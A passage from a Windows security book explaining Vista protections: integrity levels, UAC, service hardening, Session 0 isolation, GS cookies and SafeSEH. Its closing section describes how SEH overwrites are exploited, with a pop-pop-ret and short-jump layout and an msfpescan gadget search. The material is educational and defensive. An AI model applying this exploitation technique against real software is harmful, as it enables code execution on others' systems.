integrity level.  Figure 12-2  Process Explorer showing IE executing with Low integrity   374   Hacking Exposed Windows: Windows Security Secrets & Solutions   Managing Integrity Levels  So how do you configure this stuff? Along with Vista comes another tool, icacls, which  allows us to establish and query the integrity levels for an object. The following listing  demonstrates setting the C:\TempLow directory’s integrity level to Low: c:\>icacls TempLow  setintegritylevel L processed file: TempLow Successfully processed 1 files; Failed processing 0 files c:\>icacls TempLow TempLow BUILTIN\Administrators: I  F  BUILTIN\Administrators: I  OI  CI  IO  F        … Mandatory Label\Low Mandatory Level: NW  Successfully processed 1 files; Failed processing 0 files  You can see that the integrity level for TempLow is now set to Low Mandatory Level. Along  with this new capability, managing integrity levels, comes a new user right: Modify An  Object Label, which is configurable in the Local Security Policy, as shown in Figure 12-3.  This right is required to modify the integrity level of an object and, by default, is not  granted to any user or group. So how were we able to modify the integrity level of the  TempLow  directory  in  the  example?  We  own  the  folder.  Vista  allows  us  to  alter  the  integrity level of any object we own, provided we aren’t attempting to set the integrity  level  higher  than  our  own  level.  If  a  user  or  application  were  able  to  set  an  object’s  integrity level above their own level, the entire integrity system would collapse.  Figure 12-3    Modifying an object label user right   Chapter 12:  Windows Security Features and Tools   375  USER ACCOUNT CONTROL  User Account Control  UAC  is one of the most discussed and visible aspects of the Windows  Vista operating system. This is probably because, unless you’ve disabled it, it requires your  attention  more  often  than  any  other  Windows  security  feature.  On  that  note,  Microsoft  publicly states that UAC is not a security boundary, but merely an opportunity for the user  to make a decision on whether an action should take place or not. Given that many attacks  these days require some form of user intervention, UAC does raise the proverbial bar for  attackers. As such, we will discuss some of the finer points of UAC in this section.  The principle of least privilege is by no means a new concept. In fact, if you’ve been in  the security realm long you’ve heard the phrase more times than you’d care to count.  Then  why,  for  such  a  simple  concept,  is  it  so  difficult  to  implement?  In  the  software  world, two primary factors exist: usability and compatibility. Users and enterprises want  a solution that they can use straight out of the box and have it play nice with older or  disparate systems. Typically, the application of security controls hinders one, or both, of  these, so the user  or enterprise  disables the security feature and we’re back at square  one. Who’s to blame them though? In previous versions of Windows, if you wanted to  change your time zone, power settings, install a printer driver, or connect to a wireless  network that required a shared secret, you couldn’t do it as a regular user. So you, as a  user  or  person  responsible  for  an  enterprise  full  of  complaining  users,  decide  that  bumping  things  up  to  local  administrator  sounds  great.  Now  the  security  folks  are  unhappy because users are unknowingly installing evil on their machines.  The challenge here is to create a solution that makes everyone, including the security  folks, sleep better at night. That solution involves adding a notch or two between no  access and full access. This is exactly what Microsoft did when considering how to secure  the Windows Vista operating systems.  Tokens and Processes  As  discussed  in  Chapter  2,  when  a  Windows  process  is  created,  its  access  token  is  populated with the Security Identifier  SID  of the invoking user, the SID of the groups  to which the user belongs, the SID of the logon session, and a list of systemwide privileges  possessed by the user. When a process attempts to interact with another securable object,  such as a file, the contents of the process’s access token are used in conjunction with the  object’s security descriptor to determine how the process can interact with the object— such as reading or modifying it. Due to such things as the time zone printer scenario,  users  are  often  surfing  the  Web  and  reading  e-mails  under  the  context  of  the  local  Administrator.  As  such,  exploiting  a  vulnerability  in  a  mail  client  and  web  browser  provides remote attackers with full control of the operating system—a less than desirable  situation, depending on who you are. What if we could simply remove the privileges  associated  with  Administrators  and  other  powerful  groups  from  these  processes?  Wouldn’t we be better off?  UnAdmin  UAC  is  the  compromise  between  users  with  administrator  privileges  and  the  short- leashing security folks; it’s not quite warm porridge or the perfect bed, but it’s closer. It  allows non-IT users to feel empowered by granting them the ability to change WEP keys,    376   Hacking Exposed Windows: Windows Security Secrets & Solutions   install  printers,  and  set  the  clock  without  dishing  out  administrative  privileges.  To  accomplish this, during an interactive logon, UAC leans on the Local Security Authority   LSA  to detect whether the user’s token contains any elevated privileges. If it does, the  original, fully privileged token is stashed away and the LSA performs a second logon  with the filtered token. The primary advantage of this is allowing elevated accounts to  operate unprivileged until they attempt to perform an action that requires additional  privileges.  UAC considers the following privileges elevated, and they will therefore be stripped   from user tokens upon logon:     SeCreateTokenPrivilege    SeTcbPrivilege    SeTakeOwnershipPrivilege    SeBackupPrivilege    SeRestorePrivilege    SeDebugPrivilege    SeImpersonatePrivilege    SeRelabelPrivilege  By default, this affects the following groups:     Built-in Administrators    Power Users    Account Operators    Server Operators    Printer Operators    Backup Operators    RAS Servers Group    Windows NT 4.0 Application Compatibility Group    Network Conﬁ guration Operators    Domain Administrators    Domain Controllers    Certiﬁ cate Publishers    Schema Administrators    Enterprise Administrators    Group Policy Administrators  Additionally, if the user is a member of the Administrators group, the filtered token  will contain a deny-only version of this SID. This will cause Windows to consider the  Administrator’s  SID  only  when  evaluating  deny  Access  Control  Entries   ACEs   in  a    Chapter 12:  Windows Security Features and Tools   377  DACL. In short, if the DACL on an object grants the Administrators group access to the  object, the user will not be able to access the object unless he has been explicitly granted  access or by membership of another group. This can be observed by logging in to Vista  as a member of the Administrators group and running whomai  all from the command  prompt. The following listing is an example of executing this command: USER INFORMATION ---------------- User Name       SID =============== ============================================ forilldoh\mikej S-1-5-21-1726311756-936665386-659771895-1000 GROUP INFORMATION ----------------- Group Name                Type     SID           Attributes =======================   ======== ======        ======================== … BUILTIN\Administrators    Alias    S-1-5-32-544  Group used for deny only ...  It’s also worth noting that UAC does not affect service, network, or batch logons.  Once the user is logged on with the restricted token, subsequent attempts to perform  potentially sensitive actions, such as installing software or interacting with portions of  the Control Panel, will cause a dialog box to appear, requesting confirmation that you  indeed intend to take this action. Herein lies the greatest challenge to UAC—convincing  users to leave it enabled. Left enabled, UAC plugs a fairly large hole in most organizations’  and users’ security model: running as Administrator.  In the next section, we discuss how the Vista operating system has adopted some of   these concepts to beef up security related to services.  WINDOWS SERVICE HARDENING  Just as Windows XP and Server 2003 took great strides in reducing risk by limiting the  number of enabled services and the privileges possessed by them, Vista and Server 2008  have taken service level security even further with Windows Service Hardening, which  includes the following:     Service Resource Isolation    Least Privilege Services    Session 0 Isolation    Restricted Network Accessibility  Service Resource Isolation  In the event an application, service, or account becomes compromised, one of the first  things  you  start  to  ponder  is  just  how  bad  bad  is  going  to  get.  Suppose  an  attacker  compromises a web service in your DMZ: where can she go from there? Does the web  service pull information from a database that sits behind your internal firewall? What  permissions  does  the  account  used  by  the  web  service  have  on  the  database?  Can  it    378   Hacking Exposed Windows: Windows Security Secrets & Solutions   execute extended SQL procedures such as xp_cmdshell to compromise the database  server? If you entertain this thought line long enough, you may start to notice similarities  between your security controls and a set of dominos.  Let’s take this concept and apply it locally, to a single machine. Many services execute  using the same local account, such as LocalService. If one of these services is compromised,  the integrity of all other services executing as the same user is in jeopardy as well. An  attacker  can  jump  from  service  to  service.  To  compound  this,  services  typically  store  configuration information in areas of the operating system that are accessible only to  highly privileged principals. An artifact of this is a higher number of services executing  as SYSTEM. What we are left with is a group of fairly low-privileged services that are  capable of compromising each other and another group of services that operate under a  highly  privileged  context  to  store  configuration  information  securely.  Not  cool.  To  address this, Vista and Server 2008 mesh two technologies:     Service-speciﬁ c SIDs    Restricted SIDs  By assigning each service a unique SID, service resources, such as a file or Registry  key, can be ACLed to allow only that service to modify them. This gets us a bit closer to  executing services with lower privileges while protecting their configuration data.  To determine the SID assigned to a given service, we can lean on new functionality  that has been added to sc.exe: showsid. We can take this one step further and identify the  principal name associated with the service SID by running psgetsid.exe. The following  listing  demonstrates  how  to  obtain  the  SID  and  the  principal  name  of  the  WLAN  services: C:\>sc showsid wlansvc NAME: wlansvc SERVICE SID: S-1-5-80-1428027539-3309602793-2678353003-1498846795-3763184142 C:\>psgetsid S-1-5-80-1428027539-3309602793-2678353003-1498846795-3763184142 PsGetSid v1.43 - Translates SIDs to names and vice versa Copyright  C  1999-2006 Mark Russinovich Sysinternals - www.sysinternals.com Account for S-1-5-80-1428027539-3309602793-2678353003-1498846795-3763184142: Well Known Group: NT SERVICE\Wlansvc C:\>  PSGetSid is available for download from Microsoft TechNet. Go to http:  www.microsoft.com technet  sysinternals utilities psgetsid.mspx.  This alone will not prevent a compromised service that is running as LocalService  from  modifying  the  resources  of  other  services  executing  as  the  same  principal.  To  achieve this, write-restricted SIDs are used: the service SID, along with the write-restricted    Chapter 12:  Windows Security Features and Tools   379  SID   S-1-5-33 ,  is  added  to  the  service  process’s  restricted  SID  list.  When  a  restricted  process  or  thread  attempts  to  access  an  object,  two  access  checks  are  performed:  one  using the enabled token SIDs, and another using the restricted SIDs. Only if both checks  succeed  will  access  be  granted.  This  prevents  restricted  services  from  accessing  any  object that does not explicitly grant access to the service SID.  For example, assume we have two services, A and B, which execute under the con- text  of  LocalService   and  thus  have  LocalService  as  their  enabled  token  SID .  These  services  store  configuration  information  in  the  registries  under  HKLM\System\  CurrentControlSet\Services\ServiceA  and  ServiceB,  respectively.  The  DACL  on  both  Registry keys grant LocalService the ability to write to the keys. Additionally, each DACL  grants write access to the appropriate service SID. At this point, if either service is com- promised,  it  can  modify  the  configuration  information  of  the  other  service.  This  is  because both service processes contain the LocalService SID. However, if these services  are hosted in different processes and each process has its respective service SID in the re- stricted SID list, the services cannot modify each other’s Registry values. This is because  the process tokens do not have the LocalService SID added to the restricted SID list. To  determine  whether  a  service  is  restricted  or  not,  simply  run sc.exe  with  the  qsidtype option. The following listing demonstrates the results of querying unrestricted  and restricted services: C:\tools>sc qsidtype wlansvc [SC] QueryServiceConfig2 SUCCESS  SERVICE_NAME: wlansvc SERVICE_SID_TYPE:  UNRESTRICTED  C:\tools>sc qsidtype bfe [SC] QueryServiceConfig2 SUCCESS  SERVICE_NAME: bfe SERVICE_SID_TYPE:  RESTRICTED  C:\tools>sc qsidtype sysmain [SC] QueryServiceConfig2 SUCCESS  SERVICE_NAME: sysmain SERVICE_SID_TYPE:  NONE  C:\tools>  By  creating  service-specific  SIDs  and  coupling  them  with  restricted  SID  lists,  the  probability of a compromised service successfully attacking another service that executes  as the same principal is greatly reduced. In the next section, we discuss how the Windows  Service Hardening effort has reduced this even further.   380   Hacking Exposed Windows: Windows Security Secrets & Solutions   Least Privilege Services  Historically,  many  Windows  services  operated  under  the  context  of  LocalSystem,  which  grants  the  service  the  ability  to  do  just  about  anything.  From  a  security  perspective, this is a less than desirable scenario. To solve this, Microsoft introduced in  Windows Server 2003 two new security principals, LocalService and NetworkService.  These principals have far fewer rights than SYSTEM but were in some cases so limited  that many services continued to operate as SYSTEM, much like in our printer and time  zone scenarios from the UAC discussions. In Vista, the privileges granted to a service  are no longer exclusively bound to the account to which it is configured to run; they  can be explicitly requested.  Privileges a la Carte Earlier, during the discussion of the UAC, we noted that service logons are not subject to  token filtering. Therefore, if a service is configured to run as SYSTEM, its access token  will retain powerful privileges that allow it to interact freely with other securable objects.  Or will it?  To close this gap and achieve the same effect of UAC—the principle of least privileged  processes—the Service Control Manager  SCM  has been tweaked a bit. Much like the  logon  process  leaned  on  the  LSA  to  filter  tokens  on  behalf  of  UAC,  the  SCM  plays  a  similar role for services. Services are now capable of providing the SCM, and ultimately  the  LSA,  with  a  list  of  specific  privileges  that  they  require.  However,  services  cannot  request permissions that are not originally possessed by the principal to which they are  configured to start. Upon starting the service, the SCM utilizes the LSA to remove all  privileges from the services’ process that are not explicitly requested. For example, by  default, the Windows Media Player Network Service  WMPNetworkSvc  is configured  to require the following privileges:     SeChangeNotifyPrivilege    SeCreateGlobalPrivilege  This information can be obtained using sc.exe, which we will discuss a bit later in this section, or  directly  the  Registry  at  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ WMPNetworkSvc:RequiredPrivileges.  from   Using Process Explorer, we can verify that only these privileges are granted to the   WMPNetworkSvc process  Figure 12-4 .   Chapter 12:  Windows Security Features and Tools   381  Figure 12-4  Limited privileges granted to WMPNetworkSvc  For services that share a process, such as svchost, the process token will contain an  aggregate of all privileges required by each individual service in the group. From an  attacker’s standpoint, locating a vulnerability in one of these services may yield a far  more fruitful process space from which to wreak havoc. Figures 12-5 and 12-6 demonstrate  the  existence  of  19  services  being  hosted  in  a  single  process  and  the  resultant  set  of  privileges possessed by this process.  Likely  for  backward-compatibility  reasons,  if  a  service  does  not  explicitly  request  privileges, the SCM will leave intact all privileges that are granted to the principal to  which the service is configured to execute. From an attacker’s perspective, enumerating  all  services  that  neglect  to  register  required  privileges  may  also  be  a  fruitful  exercise  when selecting a target.   382   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 12-5  Nineteen services sharing a single PID  By default, many privileges are not enabled, but it is possible to enable them.  Interacting with Service Privileges  As in previous versions of Windows, services can be  configured via the command-line interface of the SCM, sc.exe. Two new options have  been added to this utility, qprivs and privs, which allow for querying and settings service  privileges, respectively. If you are looking to audit or lock down the services running on  your Vista or Server 2008 machine, these commands are invaluable. Figures 12-7 and 12-8  demonstrate their usage.   Chapter 12:  Windows Security Features and Tools   383  Figure 12-6  Aggregate of all privileges in service group  You must execute cmd.exe with Administrator privileges  such as via runas  to modify these  privileges.   384   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 12-7  Querying service privileges with sc.exe  If you start setting service privileges via sc.exe, make sure you specify all of the privileges at once.  Sc.exe does not assume you want to add the privilege to the existing list.  Figure 12-8  Setting service privileges with sc.exe   Chapter 12:  Windows Security Features and Tools   385  Service Refactoring  Service refactoring is a fancy name for running services under lower-privileged accounts,  the meat-and-potatoes way to run services with least privilege. In Vista, Microsoft has  moved eight services out of the SYSTEM context and into LocalService. An additional  four SYSTEM services have been moved to run under the NetworkService account as  well. Table 12-1 breaks this down by service.  Additionally,  six  new  service  hosts   svchosts   have  been  introduced.  These  hosts  provide added flexibility when locking down services and have been listed in order of  increasing privilege:     LocalServiceNoNetwork    LocalServiceRestricted    LocalServiceNetworkRestricted    NetworkServiceRestricted    NetworkServiceNetworkRestricted    LocalSystemNetworkRestricted  Service COM+ Event System Windows Security Windows Event Log Windows Audio Workstation Service Windows Image  Acquisition Windows Time DHCP Client Telephony Cryptographic Services Policy Agent Terminal Services  Previous Context SYSTEM SYSTEM SYSTEM SYSTEM SYSTEM SYSTEM  SYSTEM SYSTEM SYSTEM SYSTEM SYSTEM SYSTEM  New Context LOCAL SERVICE LOCAL SERVICE LOCAL SERVICE LOCAL SERVICE LOCAL SERVICE LOCAL SERVICE  LOCAL SERVICE LOCAL SERVICE NETWORK SERVICE NETWORK SERVICE NETWORK SERVICE NETWORK SERVICE  Table 12-1  Vista Services that Have Now Run Under Lower-privileged Accounts   386   Hacking Exposed Windows: Windows Security Secrets & Solutions   Each of these operates with a write-restricted token, as described earlier in this chapter, with  the exception of those with a NetworkRestricted suffix. Groups with a NetworkRestricted  suffix limit the network accessibility of the service to a fixed set of ports, which we will  cover now in a bit more detail.  Restricted Network Access  The  concept  of  restricting  applications  to  a  fixed  or  dynamic  port  is  not  new  to  the  Windows  world.  These  capabilities  were  present  back  in  XP.  However,  with  the  introduction of the new Windows Firewall with Advanced Security, network restriction  policies can be applied to services as well. In addition to the filtering capabilities of the  previous Windows Firewall, the new firewall allows administrators to create rules that  respect the following connection characteristics:    Directionality  Rules can now be applied to both ingress and egress trafﬁ c.   Protocol  The ﬁ rewall is now capable of making decisions based on an   expanded set of protocols types.    Principal  Rules can be conﬁ gured to apply only to a speciﬁ c user.   Interface  Administrators can now apply rules to a given interface set, such as   Wireless, Local Area Network, and so on.  Interacting with these and other features of the firewall are just a few of the ways services  can be additionally secured.  Session 0 Isolation  In  2002,  researcher  Chris  Paget  introduced  a  new  Windows  attack  vector,  coined  a  “Shatter Attack.” One the key pillars of this attack involved highly privileged services  interacting with the logon sessions of lower privileged users. As a refresher, the gist of a  Shatter Attack is to send a privileged service a window message that causes it to execute  attacker-provided shellcode, elevating the attacker’s privileges to that of the service  see  “References and Further Reading” for details of Shatter Attacks .  So what’s so special about Session 0? Pre-Vista services, along with the first user to  log on, participate within Session 0 and each subsequent user participates in session one,  two, three, and so on. As previously stated, attacks such as Shatter rely on the ability to  send window messages to highly privileged services. One of the reasons attackers were  able to send window messages to services was because they shared a session, Session 0.  By separating user and service sessions, Shatter-like attacks are mitigated. This is the  essence of Session 0 Isolation: in Vista, services and system processes remain in Session  0 while user sessions start at Session 1. This can be observed within Task Manager, as  shown in Figure 12-9.  You can see in Figure 12-9 that most service and system processes exist in Session 0  while user processes exist in Session 1. It’s worth noting that not all system processes  execute in Session 0. For example, winlogon.exe and an instance of csrsss.exe exist in user  sessions under the context of SYSTEM. Even so, session isolation, when coupled with  User Interface Privilege Isolation, represents an effective mitigation for a once common  vector for attackers. In the next section, we discuss additional security features that work    Chapter 12:  Windows Security Features and Tools   387  Figure 12-9  Separation between user and service sessions  fairly automagically from a security administrator’s perspective. However, understanding  how these features work is pivotal in understanding how to bypass them.  YOUR COMPILER CAN SAVE YOU  One of the most common, if not the most common, security-impacting implementation  flaws in software is the buffer overflow. Even though people have been publicly exploiting  these conditions since as early as 1988 when the Morris worm hit, they remain extremely  prevalent in software that is being written today. Over time, the software industry and  those who write operating systems have taken steps to minimize the exploitability of  these conditions. In this section, we discuss the mitigations provided by the compiler  used to build Vista and Server 2008. Before we get into the mitigations, we briefly discuss  the buffer overflow condition so that the purpose of these mitigations is clear.  An Overview of Overﬂ ows  A buffer  overflow  is  a  generic  term  used  to  describe  a  condition  that  is  the  result  of  attempting  to  store  more  information  at  a  memory  location  than  the  allocated  space  allows. For example, if a developer is writing an application that reads a series of names    388   Hacking Exposed Windows: Windows Security Secrets & Solutions   from a file, she might assume that the longest a name will ever be is 25 characters. To be  safe, she allocates enough space to account for names that are up to 50 characters long  and begins reading them in. If the file contains a name that is longer than 50 characters,  a buffer overflow occurs. If an unfriendly person is able to influence the names that enter  this file, he may be able to alter the program’s execution by surgically replacing values in  portions of memory that are adjacent to the buffer used to store the acquired name.  When an application needs to store information in memory, such as names, it has a  couple of options for where to put it: the heap or the stack. A buffer overflow can occur in  either of these locations, but for now we will focus on stack-based overflows. The stack,  which is used to control execution, comprises a series of stack frames. A stack frame is  placed on the stack each time a function is called and removed each time a function returns.  A stack frame, as created by the original Visual Studio 2003 compiler on the x86 platform,  uses the layout shown in Figure 12-10, starting with the highest memory location first.  When a stack overflow occurs, it starts moving up this stack, taking out other local  variables, exception handler structures, the frame pointer, return address, and arguments  passed to the function itself. Attackers take advantage of this behavior by overwriting  these frame components with useful values. In the coming sections, we will discuss the  following  security  features  provided  by  the  VS2003  and  VS2005  compiler  that  help  reduce the probability of an attacker successfully exploiting overflow conditions:     GS cookies    SafeSEH    Stack layout changes    Address space layout randomization  ASLR   GS Cookies  GS is a compile time technology that aims to prevent the exploitation of stack-based buffer  overflows on the Windows platform. GS achieves this by placing a random value, or cookie,  on the stack between local variables and the return address, as shown in Figure 12-11.  Figure 12-10    Standard stack frame generated by Visual Studio 2003   Chapter 12:  Windows Security Features and Tools   389  Figure 12-11  Stack frame with GS cookie  This concept is not unique to the Windows world. In fact, Linux distributions have  had similar solutions for quite some time in the form of StackGuard and ProPolice. If a  stack-based  buffer  overflows  enough  for  an  attacker  to  control  the  return  address  or  frame  pointer,  the  cookie  has  also  been  overwritten.  Therefore,  before  the  function  returns, this cookie value can be verified to ensure such an overflow has not occurred. If  the cookie value does not match the original value, an error dialog is presented to the  user and the process is terminated.  Under the Hood of GS When a native application starts up, the first function that is typically executed is one of  the C RunTime  CRT  entry points such as mainCRTStartup. The first action taken by  these functions is to call __security_init_cookie, which is responsible for initializing  the  cookie  that  will  eventually  end  up  in  every  qualified  function’s  stack  frame.  I  say  “qualified” because a number of scenarios produce a cookieless stack frame:     The optimization  O  option is not enabled.    The function does not contain a stack buffer.    The function is decorated with __declspec naked .    The function has a variable argument list  "..." .    The function begins with inline assembly code.    The compiler determines that the function’s variables are used only in ways   that are less likely to be exploitable.  Actually, previous research by Ollie Whitehouse of Symantec has uncovered another  scenario that results in a cookieless frame: a stack buffer that is smaller than 5 bytes.  However, as of VS2005 SP1, developers have the option to add additional checks to GS    390   Hacking Exposed Windows: Windows Security Secrets & Solutions   by adding the strict_gs_check on  pragma to their code. This causes the compiler  to place security cookies in places that it otherwise would not, such as buffers smaller  than 5 bytes and buffers allocated for integer arrays. The primary goal of __security_init_cookie is to generate a nondeterministic  value for the security cookie. To accomplish this, a number of environmental values are  captured, including these:     System Time    Current Process ID    Current Thread ID    Static value in the PE    Current Tick Count    Performance Counters This can be observed by disassembling the __security_init_cookie function,   as shown in the following code listing: 0:000> uf __security_init_cookie    97 00403fac 55              push    ebp    97 00403fad 8bec            mov     ebp,esp    97 00403faf 83ec10          sub     esp,10h   117 00403fb2 a110104200      mov     eax,dword ptr [overflow!__security_cookie    …   170 00403fe0 50              push    eax   170 00403fe1 ff1598524200    call    dword ptr [overflow!_imp__GetSystemTimeAsFileTime  00425298 ]   175 00403fe7 8b75fc          mov     esi,dword ptr [ebp-4]   175 00403fea 3375f8          xor     esi,dword ptr [ebp-8]   178 00403fed ff1594524200    call    dword ptr [overflow!_imp__GetCurrentProcessId  00425294 ]   178 00403ff3 33f0            xor     esi,eax   179 00403ff5 ff1574524200    call    dword ptr [overflow!_imp__GetCurrentThreadId  00425274 ]   179 00403ffb 33f0            xor     esi,eax   180 00403ffd ff1590524200    call    dword ptr [overflow!_imp__GetTickCount]   180 00404003 33f0            xor     esi,eax   182 00404005 8d45f0          lea     eax,[ebp-10h]   182 00404008 50              push    eax   182 00404009 ff158c524200    call    dword ptr  [overflow!_imp__QueryPerformanceCounter  0042528c ]   182 0040400f 8b45f4          mov     eax,dword ptr [ebp-0Ch]   182 00404012 3345f0          xor     eax,dword ptr [ebp-10h]   187 00404015 33f0            xor     esi,eax  Throughout this listing, the value of the security cookie is stored in the esi register, while  the result of each function call is stored in the eax register. Between each call, you can see  that  these  values  are  XORed  against  the  current  cookie  value,  thus  creating  a  fairly  nondeterministic security cookie.   Chapter 12:  Windows Security Features and Tools   391  While we’re on the topic of nondeterministic cookie values, Matt Miller recently wrote an article on  uninformed.org that reflects his initial research on the determinism of GS cookies. His research has  shown that due to the accessibility of entropy sources used to generate the GS cookie, local attackers  are able to increase their probability of calculating a process’s cookie value. However, at the time of  this writing, Miller’s research does not represent an immediate threat to the efficacy of GS cookies,  but it’s a start.  Once  the  cookie  has  been  initialized,  the  application  operates  normally  until  a  qualified function has been invoked. In these instances, the function prologue has been  modified  by  the  compiler  to  insert  the  cookie  into  the  stack  frame  before  the  return  address and frame pointer. This can be observed in the following code listing: 0:000> uf foo    21 00401040 55              push    ebp    21 00401041 8bec            mov     ebp,esp    21 00401043 83ec24          sub     esp,24h    21 00401046 a110104200      mov     eax,dword ptr [overflow!__security_cookie]    21 0040104b 33c5            xor     eax,ebp    21 0040104d 8945fc          mov     dword ptr [ebp-4],eax  In this listing, the first three instructions represent a typical function prologue. The next  three instructions represent modifications made by the Visual Studio compiler with  GS  enabled. The fourth instruction loads the previously initialized value of __security_ cookie in to the eax register. This value is then XORed against the current frame pointer   EBP  as seen in the fifth instruction. Finally, this value is placed in the stack frame, as  seen in the final instruction.  Before this function returns, it must ensure that the version of the cookie currently  in the stack frame matches the value stored in the previously initialized version,  __security_cookie. To accomplish this, the function’s epilogue has been modified  with the following instructions:   28 00401071 8b4dfc          mov     ecx,dword ptr [ebp-4]   28 00401074 33cd            xor     ecx,ebp   28 00401076 e86d020000      call    overflow!__security_check_cookie   004012e8   In this listing, the first instruction loads the stack frame’s version of the cookie into  the  ecx  register.  This  value  is  then  XORed  against  the  frame  pointer,  as  seen  in  the  second instruction. On Vista, this provides additional entropy due to ASLR. Finally,  the __security_check_cookie is called, which compares the value contained in ecx  against the original value in __security_cookie.  All in all, cookies are fairly effective at preventing the exploitation of stack-based  overflows  on  both  Windows  and  non-Windows  platforms.  However,  intricacies  exist  within Windows that prevent GS alone from putting an end to the prevalent exploitation  of stack-based buffer overflows. In the following section we discuss additional compile  time options that supplement GS.   392   Hacking Exposed Windows: Windows Security Secrets & Solutions   SafeSEH  Like  GS,  SafeSEH   also  known  as  Software  Data  Execution  Prevention,  or  DEP   is  a  compile-time security technology. In this instance, instead of protecting the frame pointer  and return address, the purpose of SafeSEH is to ensure that the exception handler frame  is not abused. Earlier, we discussed the stack-frame layout with respect of the GS cookie.  In that diagram, the GS cookie is placed above the exception handler frame. As originally  described in Dave Litchfield’s paper “Defeating the Stack Based Overflow Prevention  Mechanism of Microsoft Windows 2003 Server,” an attacker can overwrite the exception  handler with a controlled value and obtain code execution in a more reliable fashion  than directly overwriting the return address. To address this, SafeSEH was introduced in  Windows  XP  SP2  and  Windows  Server  2003  SP1.  Before  we  jump  into  SafeSEH,  let’s  briefly discuss Structured Exception Handling. Structured Exception Handling Exception handling is a core facility for most applications and operating systems, including  Windows.  The  goal  of  exception  handling  is  to  provide  the  application  or  operating  system with an opportunity to take action when a given condition occurs, such as dividing  by zero or attempting to access an invalid memory address. To achieve this, each thread  has the ability to register exception handlers, which are functions that execute in the event  an exception occurs. Structured Exception Handlers  SEHs  are registered by creating an  EXCEPTION_REGISTRATION_RECORD  and  prepending  it  to  the  ExceptionList attribute of the NT_TIB structure, which takes the following form: 0:000> dt _NT_TIB    +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD    +0x004 StackBase        : Ptr32 Void    +0x008 StackLimit       : Ptr32 Void    +0x00c SubSystemTib     : Ptr32 Void    +0x010 FiberData        : Ptr32 Void    +0x010 Version          : Uint4B    +0x014 ArbitraryUserPointer : Ptr32 Void    +0x018 Self             : Ptr32 _NT_TIB  The NT_TIB structure is defined in winnt.h. From this, we can see that the ExceptionList attribute is the first attribute of the  NT_TIB  and  is  a  pointer  to  a  linked  list  of  EXCEPTION_REGISTRATION_RECORDs. EXCEPTION_REGISTRATION_RECORDs  contain  two  pointers,  one  to  the  Next EXCEPTION_REGISTRATION_RECORD  in  the  list  and  another  to  the  actual Handler, which is a callback function that is given the opportunity to take action when an exception  occurs. On an Intel platform, we can access this ExceptionList via the pointer located  at FS:0. By dereferencing the Next pointer of the EXCEPTION_REGISTRATION_RECORD at this location we can walk the list until we encounter a value of 0xFFFFFFFF, which  denotes the end of the record chain. This can be observed in the following listing.   Chapter 12:  Windows Security Features and Tools   393  0:000> dt _EXCEPTION_REGISTRATION_RECORD poi poi fs:0      +0x000 Next             : 0x0012ff90 _EXCEPTION_REGISTRATION_RECORD    +0x004 Handler          : 0x004012c0     exceptions!_except_handler4+0 0:000> dt _EXCEPTION_REGISTRATION_RECORD 0x0012ff90    +0x000 Next             : 0x0012ffdc _EXCEPTION_REGISTRATION_RECORD    +0x004 Handler          : 0x004012c0     exceptions!_except_handler4+0 0:000> dt _EXCEPTION_REGISTRATION_RECORD 0x0012ffdc    +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD    +0x004 Handler          : 0x77138bf2     ntdll!_except_handler4+0  When an exception occurs, the OS walks this same list until it reaches the end or one  of the callbacks decides to handle the exception. A handler makes the OS aware of its  decision  by  returning  one  of  a  handful  of  values,  including  ExceptionContinue Execution or ExceptionContinueSearch. The former instructs the OS to retry the  instruction  that  caused  the  exception,  as  the  handler  presumably   or  not   took  some  action, and the latter instructs the OS to continue walking the list looking for volunteers. So this is what we have so far: a stack-based mechanism that allows each thread to  define a block of code that will acquire execution control upon the occurrence of a given  condition.  An  important  artifact  of  this  mechanism  is  the  presence  of  juicy  function  pointers on the stack. Let’s take a look at how these function pointers have been abused  to compromise systems near you.  Exploiting SEH Overwrites  As previously stated, abusing the SEH is not exactly breaking news. However, we will  briefly discuss how to exploit an SEH overwrite so that the benefits of SafeSEH become  more apparent. One of the first things to be aware of is that the stack location is not  deterministic—not even in earlier versions of Windows that lack the benefits of ASLR.  The implications of this from an exploitability standpoint are significant. We can’t simply  overwrite  a  return  address  or  function  pointer  with  a  hard-coded  stack  address  that  points to our shellcode. Instead, we must add a level of indirection by overwriting with  a deterministic address containing instructions that pass execution control back to our  shellcode, such as pop,pop,ret. Today, finding such locations in a pre–Vista Server  2008 target is as easy as using a web browser. The Metasploit Project has an online opcode  database that allows us to search for memory locations that contain the instructions we  need. If you’re looking for a destination that resides in a custom dynamic link library   DLL , you can use msfpescan as shown in the following listing: C:\>ruby c:\tools\msf\msfpescan -p c:\cygwin\bin\cygcrypt-0.dll [c:\cygwin\bin\cygcrypt-0.dll] 0x10001042 pop esi; pop ebp; ret 0x1000110c pop edi; pop ebp; ret 0x100011c4 pop edi; pop ebp; ret 0x100012d7 pop edi; pop ebp; ret 0x10001470 pop edi; pop ebp; ret 0x10001704 pop edi; pop ebp; ret 0x10001ae3 pop esi; pop ebp; ret   394   Hacking Exposed Windows: Windows Security Secrets & Solutions   When exploiting an SEH overwrite, an attacker clobbers the Handler attribute of the  EXCEPTION_REGISTRATION_RECORD  with  the  address  of  an  instruction  sequence  similar  to  pop,pop,ret.  When  an  exception  occurs,  this  causes  Windows  to  pass  execution to this address, which subsequently returns to the location on the stack of the  Next attribute of the EXCEPTION_REGISTRATION_RECORD. The Next attribute is also  controlled by the attacker, but if we recall the stack layout from earlier, the Next attribute  is below the Handler attribute. This limits the attacker to 4 bytes before running into the  very Handler  address  he  previously  supplied  to  originally  obtain  code  execution.  However, by overwriting the Next attribute with instructions that jump the Handler attribute,  the  attacker  typically  has  enough  room  for  arbitrary  shellcode—and  this  is  exactly what happens. Figure 12-12 illustrates what this looks like. Here we can see execution begins at the Handler attribute, which points to an area  of memory containing a pop,pop,ret sequence. This lands at the Next attribute, where  a pair of NOPs  0x90  and a 6-byte short jump await us. EB is the Intel opcode for short  jump. These values are read from right to left to account for endianess.  Now that you understand how these conditions have been exploited, let’s take a look  at  some  of  the  mechanisms  provided  by  SafeSEH  that  help  prevent  this  type  of  exploitation.  SafeSEH in Action In  an  effort  to  prevent  attackers  from  abusing  exception  handlers,  a  majority  of  the  executables shipped with Windows XP SP2, 2K3 SP1, Vista, and Server 2008 contain a  table  of  safe  exception  handlers.  When  an  exception  occurs,  